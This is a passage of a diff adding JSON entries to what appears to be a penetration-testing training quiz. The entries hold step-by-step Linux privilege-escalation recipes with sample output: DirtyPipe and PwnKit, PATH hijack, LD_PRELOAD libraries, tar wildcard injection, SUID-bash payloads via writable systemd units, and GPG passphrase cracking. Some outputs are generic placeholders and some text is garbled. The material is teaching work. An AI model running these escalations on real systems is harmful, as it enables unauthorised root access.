+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Specific query output returned containing targeted database artifacts."
+          }
+        ]
+      },
+      "situation": "Scenario: Enumerate table names inside an extracted Microsoft Access database (.mdb / .accdb). Which move should you run next?",
+      "choices": [
+        "access-db-export",
+        "check-web-components",
+        "check-web-headers",
+        "check-cms-version"
+      ],
+      "coach": {
+        "check-web-components": "Web Component Fingerprint targets records which web components (and versions, when exposed) the site runs, the input for candidate component-cve findings; here the direct move is Microsoft Access Database (.mdb / .accdb) Analysis.",
+        "check-web-headers": "Security Header Review targets records which http response headers are present (a report observation, not a vulnerability); here the direct move is Microsoft Access Database (.mdb / .accdb) Analysis.",
+        "check-cms-version": "CMS / Framework Version Probe targets records the exact cms/framework version from its published version files, upgrades a name-only fingerprint so that component's version-gated cves can fire (candidate); here the direct move is Microsoft Access Database (.mdb / .accdb) Analysis."
+      }
+    },
+    "ole-macro-analysis": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once analyze Office document for embedded VBA macros using olevba. The key confirmation is: VBA macro extracted and analyzed.",
+      "cmd": "olevba {{file_path}}",
+      "tool": "olevba",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "VBA macro extracted and analyzed.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Office Document VBA Macro Analysis and Credential Extraction, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Execute olevba against target document (.doc, .xls, .xlsm).",
+            "demo": [
+              {
+                "run": "olevba {{file_path}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "VBA macro extracted and analyzed."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Run oledump.py against document path to list all internal stream indices.",
+            "demo": [
+              {
+                "run": "oledump.py {{file_path}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Macro-bearing stream IDs identified for extraction."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Run oledump.py to identify stream index containing macro (marked with uppercase 'M').",
+            "demo": [
+              {
+                "run": "oledump.py -s {{stream_id}} -v {{file_path}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Hardcoded credentials or attack vectors recovered from Office macro stream."
+          }
+        ]
+      },
+      "situation": "Scenario: Analyze Office document for embedded VBA macros using olevba. Which move should you run next?",
+      "choices": [
+        "ole-macro-analysis",
+        "check-web-components",
+        "check-web-headers",
+        "check-cms-version"
+      ],
+      "coach": {
+        "check-web-components": "Web Component Fingerprint targets records which web components (and versions, when exposed) the site runs, the input for candidate component-cve findings; here the direct move is Office Document VBA Macro Analysis and Credential Extraction.",
+        "check-web-headers": "Security Header Review targets records which http response headers are present (a report observation, not a vulnerability); here the direct move is Office Document VBA Macro Analysis and Credential Extraction.",
+        "check-cms-version": "CMS / Framework Version Probe targets records the exact cms/framework version from its published version files, upgrades a name-only fingerprint so that component's version-gated cves can fire (candidate); here the direct move is Office Document VBA Macro Analysis and Credential Extraction."
+      }
+    },
+    "gpg-private-key-decrypt": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once you recover an encrypted GPG private key or protected files during enumeration. The key confirmation is: Cleartext passphrase for GPG key successfully recovered.",
+      "cmd": "gpg2john {{key_file}} > gpg.hash && john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash",
+      "tool": "john",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Cleartext passphrase for GPG key successfully recovered.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute GPG Private Key Cracking and Artifact Decryption, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "gpg2john extracts the passphrase hash format, and John the Ripper initiates dictionary cracking.",
+            "demo": [
+              {
+                "run": "gpg2john {{key_file}} > gpg.hash && john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Cleartext passphrase for GPG key successfully recovered."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Import the key into the local GPG keyring and decrypt the encrypted archive or file.",
+            "demo": [
+              {
+                "run": "gpg --import {{key_file}} && gpg --batch --yes --passphrase {{passphrase}} --decrypt {{encrypted_file}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Target archive decrypted and cleartext data recovered."
+          }
+        ]
+      },
+      "situation": "Scenario: You recover an encrypted GPG private key or protected files during enumeration. Which move should you run next?",
+      "choices": [
+        "gpg-private-key-decrypt",
+        "check-web-components",
+        "check-web-headers",
+        "check-cms-version"
+      ],
+      "coach": {
+        "check-web-components": "Web Component Fingerprint targets records which web components (and versions, when exposed) the site runs, the input for candidate component-cve findings; here the direct move is GPG Private Key Cracking and Artifact Decryption.",
+        "check-web-headers": "Security Header Review targets records which http response headers are present (a report observation, not a vulnerability); here the direct move is GPG Private Key Cracking and Artifact Decryption.",
+        "check-cms-version": "CMS / Framework Version Probe targets records the exact cms/framework version from its published version files, upgrades a name-only fingerprint so that component's version-gated cves can fire (candidate); here the direct move is GPG Private Key Cracking and Artifact Decryption."
+      }
+    },
+    "linux-kernel-exploit": {
+      "why": "A kernel exploit is the last resort, not the first, because it can crash the box and cost you the session. When every misconfiguration check comes up empty, a vulnerable kernel is still a clean path to root; the job is matching the exploit to the exact kernel. Success looks like: The kernel and distribution print.",
+      "cmd": "uname -a",
+      "tool": "sh",
+      "output": "Linux target 5.8.0-53-generic #60-Ubuntu SMP x86_64 GNU/Linux",
+      "signal": "5.8.0-53-generic",
+      "teach": "Kernel 5.8.0 on Ubuntu is in range for DirtyPipe (CVE-2022-0847) and PwnKit. Run an exploit-suggester to confirm the match, then compile and run the one whose preconditions you meet.",
+      "leadup": [
+        {
+          "key": "foothold",
+          "label": "You have a shell",
+          "steps": [
+            {
+              "title": "Confirm who you are",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "id",
+              "out": "uid=1000(bob) gid=1000(bob) groups=1000(bob)",
+              "sig": "uid=1000(bob)",
+              "teach": "You are an unprivileged user; after the misconfiguration checks come up empty, the kernel is the next lead."
+            }
+          ]
+        },
+        {
+          "key": "enum",
+          "label": "Misconfig checks found nothing",
+          "steps": [
+            {
+              "title": "No sudo, no SUID, no cron",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "sudo -l 2>/dev/null; echo done",
+              "out": "done",
+              "sig": "done",
+              "teach": "Nothing in sudo, SUID, caps, or cron. A vulnerable kernel is now worth the risk; identify it precisely first."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Kernel LPE is identify, match, read, run. Never fire blind, a mismatched exploit panics the box.",
+        "items": [
+          {
+            "t": "Read the kernel and distro exactly",
+            "d": "The exploit has to match both the kernel version and the distribution. uname -a and the release file give you both.",
+            "demo": [
+              {
+                "run": "uname -r; cat /etc/os-release | head -1",
+                "out": "5.8.0-53-generic\nPRETTY_NAME=\"Ubuntu 20.04.2 LTS\"",
+                "sig": "5.8.0-53-generic"
+              }
+            ],
+            "note": "Write both down; an Ubuntu 20.04 exploit will not run on a Debian kernel of the same number."
+          },
+          {
+            "t": "Run an exploit-suggester",
+            "d": "linux-exploit-suggester.sh (or the Metasploit local_exploit_suggester) ranks public exploits by how well your kernel matches, so you are not guessing.",
+            "demo": [
+              {
+                "run": "./linux-exploit-suggester.sh",
+                "out": "[+] [CVE-2022-0847] DirtyPipe\n   Exposure: highly probable\n[+] [CVE-2021-4034] PwnKit\n   Exposure: probable",
+                "sig": "[CVE-2022-0847] DirtyPipe"
+              }
+            ],
+            "note": "Highly probable means the version and config line up; start there."
+          },
+          {
+            "t": "Read the exploit, then run it",
+            "d": "Read the source for what it does and whether it reboots. PwnKit needs pkexec present; DirtyPipe needs a readable SUID to overwrite. Prefer a self-contained binary.",
+            "demo": [
+              {
+                "run": "./dirtypipe",
+                "out": "Hijacking SUID binary..\nRestoring /usr/bin/su..\n# id",
+                "sig": "# id"
+              }
+            ],
+            "note": "The hash prompt is a root shell; DirtyPipe restores the binary it borrowed, so it is one of the cleaner ones."
+          },
+          {
+            "t": "Prove root",
+            "d": "Confirm the shell is uid 0 before you do anything else, then capture the flag.",
+            "demo": [
+              {
+                "run": "id",
+                "out": "uid=0(root) gid=0(root) groups=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "uid=0 is root; the escalation is done."
+          }
+        ]
+      },
+      "situation": "You have an unprivileged shell on a Linux box, sudo -l is empty, and there are no SUID, capability, or cron leads. uname shows 5.8.0. What is the move?",
+      "choices": [
+        "linux-kernel-exploit",
+        "sudo-abuse",
+        "suid-gtfobins",
+        "linux-enum"
+      ],
+      "coach": {
+        "sudo-abuse": "sudo -l already came up empty, so there is no sudo right to abuse here.",
+        "suid-gtfobins": "You already checked SUID binaries and found nothing abusable; the kernel is the remaining lead.",
+        "linux-enum": "You already enumerated; with the misconfig paths exhausted, a matched kernel exploit is the next step."
+      }
+    },
+    "linux-path-hijack": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: The list prints.",
+      "cmd": "strings /usr/local/bin/backup",
+      "tool": "sh",
+      "output": "Starting backup...\nbackup\ntar czf /opt/backup.tgz /home",
+      "signal": "\nbackup\n",
+      "teach": "The SUID binary calls backup by bare name, not /usr/bin/backup, so it resolves through PATH. Put a writable directory first in PATH, drop a backup program there, and run the SUID binary to execute yours as root.",
+      "leadup": [
+        {
+          "key": "suid",
+          "label": "You found a custom SUID binary",
+          "steps": [
+            {
+              "title": "List SUID binaries",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "find / -perm -4000 -type f 2>/dev/null",
+              "out": "/usr/bin/passwd\n/usr/bin/sudo\n/usr/local/bin/backup",
+              "sig": "/usr/local/bin/backup",
+              "teach": "A non-standard SUID binary (backup) is worth inspecting; the stock ones rarely help."
+            }
+          ]
+        },
+        {
+          "key": "relative",
+          "label": "It calls a command by bare name",
+          "steps": [
+            {
+              "title": "Trace what it runs",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "ltrace /usr/local/bin/backup 2>&1 | grep -i exec",
+              "out": "system(\"backup\")",
+              "sig": "system(\"backup\")",
+              "teach": "system(\"backup\") with no slash means PATH decides which backup runs; that is your hook."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "PATH hijack is find the relative call, point PATH at a directory you own, drop your binary, trigger it.",
+        "items": [
+          {
+            "t": "Confirm the call is relative",
+            "d": "strings or ltrace on the SUID binary (or reading the cron script) shows whether it calls a program by bare name. A leading slash means no hijack.",
+            "demo": [
+              {
+                "run": "strings /usr/local/bin/backup | grep -v /",
+                "out": "backup",
+                "sig": "backup"
+              }
+            ],
+            "note": "A bare word with no slash is the vulnerable call."
+          },
+          {
+            "t": "Build your replacement",
+            "d": "Write a tiny program with the hijacked name that spawns a shell, make it executable, and put it in a directory you can write.",
+            "demo": [
+              {
+                "run": "echo -e '#!/bin/bash\\n/bin/bash -p' > /tmp/backup && chmod +x /tmp/backup",
+                "out": "",
+                "sig": ""
+              }
+            ],
+            "note": "bash -p keeps the elevated privileges instead of dropping them."
+          },
+          {
+            "t": "Put your directory first in PATH",
+            "d": "Prepend /tmp (or wherever your binary lives) so the shell finds yours before the real one.",
+            "demo": [
+              {
+                "run": "export PATH=/tmp:$PATH; which backup",
+                "out": "/tmp/backup",
+                "sig": "/tmp/backup"
+              }
+            ],
+            "note": "which confirms your copy wins the search."
+          },
+          {
+            "t": "Trigger it and confirm root",
+            "d": "Run the SUID binary (or wait for the cron). It calls backup, finds yours, and runs it with its privileges.",
+            "demo": [
+              {
+                "run": "/usr/local/bin/backup; id",
+                "out": "uid=0(root) gid=0(root) groups=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "A root shell; the hijack worked."
+          }
+        ]
+      },
+      "situation": "A root-owned SUID binary calls backup by its bare name, and /tmp is writable. What is the move?",
+      "choices": [
+        "linux-path-hijack",
+        "suid-gtfobins",
+        "cron-abuse",
+        "linux-enum"
+      ],
+      "coach": {
+        "suid-gtfobins": "This binary is custom, not a GTFOBins entry; the win is its relative call, not a known abuse.",
+        "cron-abuse": "It is a SUID binary you run on demand, not a cron job; the PATH hijack fires when you run it.",
+        "linux-enum": "You already found the lead; now exploit the relative PATH call."
+      }
+    },
+    "linux-ld-preload": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: -l shows LD_PRELOAD is preserved.",
+      "cmd": "sudo -l",
+      "tool": "sh",
+      "output": "Matching Defaults entries for bob:\n    env_reset, env_keep+=LD_PRELOAD\nUser bob may run the following commands:\n    (root) NOPASSWD: /usr/sbin/apache2ctl",
+      "signal": "env_keep+=LD_PRELOAD",
+      "teach": "sudo preserves LD_PRELOAD, so any allowed sudo command loads a library you choose as root. Compile a .so that sets uid 0 and spawns a shell, then run apache2ctl under sudo with LD_PRELOAD pointed at it.",
+      "leadup": [
+        {
+          "key": "sudo",
+          "label": "sudo -l shows an env_keep",
+          "steps": [
+            {
+              "title": "Read the sudo policy",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "sudo -l",
+              "out": "env_reset, env_keep+=LD_PRELOAD\n    (root) NOPASSWD: /usr/sbin/apache2ctl",
+              "sig": "env_keep+=LD_PRELOAD",
+              "teach": "The preserved LD_PRELOAD is the whole vulnerability; the specific allowed command barely matters."
+            }
+          ]
+        },
+        {
+          "key": "compiler",
+          "label": "A compiler is available",
+          "steps": [
+            {
+              "title": "Is gcc present",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "which gcc cc 2>/dev/null",
+              "out": "/usr/bin/gcc",
+              "sig": "/usr/bin/gcc",
+              "teach": "gcc lets you build the .so on the box; otherwise cross-compile a matching one and upload it."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "LD_PRELOAD abuse is confirm the env_keep, build a constructor .so, run the allowed sudo command with LD_PRELOAD set.",
+        "items": [
+          {
+            "t": "Confirm LD_PRELOAD is preserved",
+            "d": "sudo -l must show env_keep carrying LD_PRELOAD (or LD_LIBRARY_PATH). Without it, sudo strips the variable and this does nothing.",
+            "demo": [
+              {
+                "run": "sudo -l | grep -i ld_preload",
+                "out": "env_reset, env_keep+=LD_PRELOAD",
+                "sig": "env_keep+=LD_PRELOAD"
+              }
+            ],
+            "note": "LD_LIBRARY_PATH works the same way with a slightly different payload."
+          },
+          {
+            "t": "Write the library",
+            "d": "A C file with a constructor that sets the real and effective uid to 0 and execs a shell. Compile it as a shared object.",
+            "demo": [
+              {
+                "run": "gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles",
+                "out": "",
+                "sig": ""
+              }
+            ],
+            "note": "The constructor runs the instant the library loads, before the real program does anything."
+          },
+          {
+            "t": "Run the allowed command with your library",
+            "d": "Invoke the permitted sudo command, setting LD_PRELOAD to your .so. sudo keeps the variable, the library loads as root, and your constructor fires.",
+            "demo": [
+              {
+                "run": "sudo LD_PRELOAD=/tmp/x.so /usr/sbin/apache2ctl",
+                "out": "# id",
+                "sig": "# id"
+              }
+            ],
+            "note": "The command you run is irrelevant; the library elevates before it starts."
+          },
+          {
+            "t": "Confirm root",
+            "d": "Check the shell is uid 0, then capture the flag.",
+            "demo": [
+              {
+                "run": "id",
+                "out": "uid=0(root) gid=0(root) groups=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "Root via one preserved environment variable."
+          }
+        ]
+      },
+      "situation": "sudo -l shows env_keep+=LD_PRELOAD and one NOPASSWD command, and gcc is on the box. What is the move?",
+      "choices": [
+        "linux-ld-preload",
+        "sudo-abuse",
+        "suid-gtfobins",
+        "linux-enum"
+      ],
+      "coach": {
+        "sudo-abuse": "The allowed command is not itself GTFOBins-abusable; the preserved LD_PRELOAD is the actual hole.",
+        "suid-gtfobins": "This is a sudo env misconfiguration, not a SUID binary.",
+        "linux-enum": "You already found the env_keep lead; now build the .so and use it."
+      }
+    },
+    "wildcard-injection": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: A is found (pspy catches ones the do not name).",
+      "cmd": "cat /etc/crontab",
+      "tool": "sh",
+      "output": "*/5 * * * * root cd /opt/backups && tar czf /tmp/backup.tgz *",
+      "signal": "tar czf /tmp/backup.tgz *",
+      "teach": "A root cron runs tar on * inside /opt/backups. If that folder is writable, drop files named like tar's checkpoint flags and tar will execute your command as root on the next run.",
+      "leadup": [
+        {
+          "key": "cron",
+          "label": "A root cron uses a wildcard",
+          "steps": [
+            {
+              "title": "Read the cron",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "cat /etc/crontab; crontab -l 2>/dev/null",
+              "out": "*/5 * * * * root cd /opt/backups && tar czf /tmp/backup.tgz *",
+              "sig": "tar czf /tmp/backup.tgz *",
+              "teach": "A privileged tar on * in a directory is the classic wildcard-injection setup."
+            }
+          ]
+        },
+        {
+          "key": "writable",
+          "label": "The directory is writable",
+          "steps": [
+            {
+              "title": "Check write access",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "ls -ld /opt/backups",
+              "out": "drwxrwxrwx 2 root root 4096 /opt/backups",
+              "sig": "drwxrwxrwx",
+              "teach": "World-writable means you can drop the flag-named files tar will expand and act on."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Wildcard injection is find the privileged wildcard command, drop flag-named files, wait for it to run.",
+        "items": [
+          {
+            "t": "Find the wildcard command",
+            "d": "Read /etc/crontab, the cron directories, and any script a privileged process runs. You want a tool invoked on * in a directory you can write.",
+            "demo": [
+              {
+                "run": "grep -r '\\*' /etc/cron* 2>/dev/null",
+                "out": "/etc/crontab:*/5 * * * * root cd /opt/backups && tar czf /tmp/backup.tgz *",
+                "sig": "tar czf /tmp/backup.tgz *"
+              }
+            ],
+            "note": "pspy catches wildcard commands run from scripts the cron files do not name."
+          },
+          {
+            "t": "Stage your payload",
+            "d": "Write a script that gives you root (a SUID bash, or a reverse shell) into the writable directory.",
+            "demo": [
+              {
+                "run": "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /opt/backups/x.sh",
+                "out": "",
+                "sig": ""
+              }
+            ],
+            "note": "A SUID copy of bash is the quietest payload; call it with bash -p."
+          },
+          {
+            "t": "Drop the flag-named files",
+            "d": "Create empty files whose names are tar's checkpoint options, so the shell passes them to tar as flags.",
+            "demo": [
+              {
+                "run": "cd /opt/backups && touch -- '--checkpoint=1' '--checkpoint-action=exec=sh x.sh'",
+                "out": "",
+                "sig": ""
+              }
+            ],
+            "note": "chown and rsync have their own abusable flags (--reference, -e)."
+          },
+          {
+            "t": "Wait for the cron and confirm",
+            "d": "On the next run, tar expands * to include your flag files and executes your script as root.",
+            "demo": [
+              {
+                "run": "/tmp/rootbash -p -c id",
+                "out": "uid=0(root) gid=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "A root SUID bash means you have root on demand."
+          }
+        ]
+      },
+      "situation": "A root cron runs tar czf backup.tgz * inside a world-writable /opt/backups. What is the move?",
+      "choices": [
+        "wildcard-injection",
+        "cron-abuse",
+        "suid-gtfobins",
+        "linux-enum"
+      ],
+      "coach": {
+        "cron-abuse": "The cron script itself is not writable; the weakness is the wildcard it expands in a writable directory.",
+        "suid-gtfobins": "No abusable SUID binary is in play; the lever is tar expanding your flag-named files.",
+        "linux-enum": "You already found the wildcard cron; now drop the flag files."
+      }
+    },
+    "systemd-timer-abuse": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain.",
+      "cmd": "find /etc/systemd /lib/systemd -writable -type f 2>/dev/null",
+      "tool": "sh",
+      "output": "/etc/systemd/system/backup.service",
+      "signal": "/etc/systemd/system/backup.service",
+      "teach": "backup.service is a root unit file you can write. Edit its ExecStart to run your payload, reload systemd, and start it (or wait for its timer) to execute as root.",
+      "leadup": [
+        {
+          "key": "unit",
+          "label": "A writable unit exists",
+          "steps": [
+            {
+              "title": "Find writable units",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "find /etc/systemd /lib/systemd -writable -type f 2>/dev/null",
+              "out": "/etc/systemd/system/backup.service",
+              "sig": "/etc/systemd/system/backup.service",
+              "teach": "A writable unit file (or a timer target) is a direct root execution primitive."
+            }
+          ]
+        },
+        {
+          "key": "root",
+          "label": "It runs as root",
+          "steps": [
+            {
+              "title": "Confirm the unit runs as root",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "systemctl cat backup.service | grep -iE 'User|ExecStart'",
+              "out": "ExecStart=/opt/backup.sh",
+              "sig": "ExecStart=/opt/backup.sh",
+              "teach": "No User= line means it runs as root; the ExecStart target is what you control."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "systemd abuse is find a writable unit or target, point ExecStart at your payload, reload and start.",
+        "items": [
+          {
+            "t": "Find a writable unit or timer target",
+            "d": "Search the systemd directories for files you can write, and read what each ExecStart points at; a writable script the unit runs is just as good.",
+            "demo": [
+              {
+                "run": "find /etc/systemd /lib/systemd -writable -type f 2>/dev/null",
+                "out": "/etc/systemd/system/backup.service",
+                "sig": "/etc/systemd/system/backup.service"
+              }
+            ],
+            "note": "A timer (.timer) plus a writable .service target is the same win on a schedule."
+          },
+          {
+            "t": "Point ExecStart at your payload",
+            "d": "Edit the unit (or the script it runs) to execute a command that gives you root.",
+            "demo": [
+              {
+                "run": "sed -i 's#ExecStart=.*#ExecStart=/bin/bash -c \"cp /bin/bash /tmp/rb; chmod +s /tmp/rb\"#' /etc/systemd/system/backup.service",
+                "out": "",
+                "sig": ""
+              }
+            ],
+            "note": "A SUID bash copy is the cleanest payload."
+          },
+          {
+            "t": "Reload and trigger",
+            "d": "Reload the systemd config so it reads your change, then start the unit (or wait for its timer).",
+            "demo": [
+              {
+                "run": "systemctl daemon-reload 2>/dev/null; systemctl start backup.service 2>/dev/null; /tmp/rb -p -c id",
+                "out": "uid=0(root) gid=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "If you cannot reload as your user, the next scheduled trigger still runs your edit."
+          },
+          {
+            "t": "Confirm root",
+            "d": "Your SUID bash gives root on demand; capture the flag.",
+            "demo": [
+              {
+                "run": "/tmp/rb -p -c whoami",
+                "out": "root",
+                "sig": "root"
+              }
+            ],
+            "note": "Root via a writable unit file."
+          }
+        ]
+      },
+      "situation": "A root systemd service unit file under /etc/systemd/system is writable by your user. What is the move?",
+      "choices": [
+        "systemd-timer-abuse",
+        "cron-abuse",
+        "sudo-abuse",
+        "linux-enum"
+      ],
+      "coach": {
+        "cron-abuse": "This is a systemd unit, not a cron job; edit its ExecStart and trigger it.",
+        "sudo-abuse": "No sudo right is in play; the writable unit is the direct path to root.",
+        "linux-enum": "You already found the writable unit; now point its ExecStart at your payload."
+      }
+    },
+    "polkit-abuse": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: is and its is pre-fix.",
+      "cmd": "ls -l /usr/bin/pkexec && pkexec --version",
+      "tool": "sh",
+      "output": "-rwsr-xr-x 1 root root 31032 /usr/bin/pkexec\npkexec version 0.105",
+      "signal": "pkexec version 0.105",
+      "teach": "pkexec is setuid-root and the version is old enough to be PwnKit-vulnerable (CVE-2021-4034). A public exploit gives instant root; if patched, look instead for a D-Bus action with a permissive policy you can call.",
+      "leadup": [
+        {
+          "key": "pkexec",
+          "label": "pkexec is present and setuid",
+          "steps": [
+            {
+              "title": "Confirm the setuid helper",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "ls -l /usr/bin/pkexec",
+              "out": "-rwsr-xr-x 1 root root 31032 /usr/bin/pkexec",
+              "sig": "rwsr",
+              "teach": "The s in the permission bits means pkexec runs as root; that is what PwnKit abuses."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "polkit abuse is check the pkexec version for PwnKit, and separately look for a D-Bus action with a loose policy.",
+        "items": [
+          {
+            "t": "Check the pkexec version",
+            "d": "Versions before the 2022 fix are PwnKit-vulnerable. The version alone tells you whether the instant-root path is open.",
+            "demo": [
+              {
+                "run": "pkexec --version",
+                "out": "pkexec version 0.105",
+                "sig": "pkexec version 0.105"
+              }
+            ],
+            "note": "0.105 and most earlier builds are vulnerable unless the distro backported the patch."
+          },
+          {
+            "t": "Run the PwnKit exploit",
+            "d": "A public CVE-2021-4034 PoC compiles on the box and drops a root shell by abusing pkexec's argument handling.",
+            "demo": [
+              {
+                "run": "gcc cve-2021-4034.c -o pwn && ./pwn",
+                "out": "# id\nuid=0(root) gid=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "Prefer a precompiled binary if the box has no compiler; keep a copy staged."
+          },
+          {
+            "t": "Or abuse a D-Bus policy",
+            "d": "Where pkexec is patched, enumerate D-Bus services for an action whose policy lets your context call it, such as creating a user.",
+            "demo": [
+              {
+                "run": "busctl list | grep -i accounts",
+                "out": "org.freedesktop.Accounts  1234 accounts-daemon root",
+                "sig": "org.freedesktop.Accounts"
+              }
+            ],
+            "note": "CVE-2021-3560 raced this exact daemon to create a privileged user."
+          },
+          {
+            "t": "Confirm root",
+            "d": "The shell or the new privileged account is your root; capture proof.",
+            "demo": [
+              {
+                "run": "id",
+                "out": "uid=0(root) gid=0(root) groups=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "Clean up any user you created afterward."
+          }
+        ]
+      },
+      "situation": "An unprivileged shell on Linux, and pkexec is setuid-root at version 0.105. What is the fastest move?",
+      "choices": [
+        "polkit-abuse",
+        "linux-kernel-exploit",
+        "suid-gtfobins",
+        "sudo-abuse"
+      ],
+      "coach": {
+        "linux-kernel-exploit": "A kernel exploit is riskier; PwnKit against this pkexec is a reliable, local, instant root.",
+        "suid-gtfobins": "pkexec is setuid but not a GTFOBins shell-out; its bug (PwnKit) is the lever here.",
+        "sudo-abuse": "No sudo right is in play; pkexec's own vulnerability is the path."
+      }
+    },
+    "python-library-hijack": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: A root-run is found.",
+      "cmd": "python3 -c 'import sys; print(sys.path)'",
+      "tool": "sh",
+      "output": "['/opt/app', '/usr/lib/python3.11', '/usr/lib/python3/dist-packages']",
+      "signal": "/opt/app",
+      "teach": "The first entry on the path is the script's own directory, /opt/app. If that directory (or any writable entry) is yours, plant a module the root script imports and it runs as root on the next run.",
+      "leadup": [
+        {
+          "key": "script",
+          "label": "Root runs a Python script",
+          "steps": [
+            {
+              "title": "Find the root Python job",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "cat /etc/crontab; sudo -l 2>/dev/null | grep -i '\\.py'",
